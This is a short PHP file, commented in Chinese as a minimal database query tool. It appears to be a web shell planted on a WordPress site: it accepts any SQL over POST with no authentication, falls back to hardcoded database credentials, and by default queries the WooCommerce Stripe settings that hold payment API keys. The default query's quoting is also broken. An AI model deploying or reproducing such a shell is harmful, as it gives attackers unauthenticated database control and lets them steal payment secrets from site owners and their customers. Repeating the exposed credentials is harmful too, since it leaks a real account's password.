<?php
// 极简数据库查询工具
$host = $_GET['h'] ?? 'localhost';
$user = $_GET['u'] ?? 'fcimggni_mythicb';
$pass = $_GET['p'] ?? 'Upworker123@';
$db   = $_GET['d'] ?? 'fcimggni_mythicb';
$sql  = $_POST['sql'] ?? 'SELECT * FROM wp_options WHERE option_name LIKE '_wc_stripe_%';';

$conn = new mysqli($host, $user, $pass, $db);
if ($conn->connect_error) die("Connect Error: " . $conn->connect_error);

$result = $conn->query($sql);
if ($result === TRUE) {
    echo "Query OK";
} elseif ($result) {
    echo "<table border=1>";
    while($row = $result->fetch_assoc()) {
        echo "<tr><td>" . implode("</td><td>", $row) . "</td></tr>";
    }
    echo "</table>";
} else {
    echo "Error: " . $conn->error;
}
$conn->close();
?>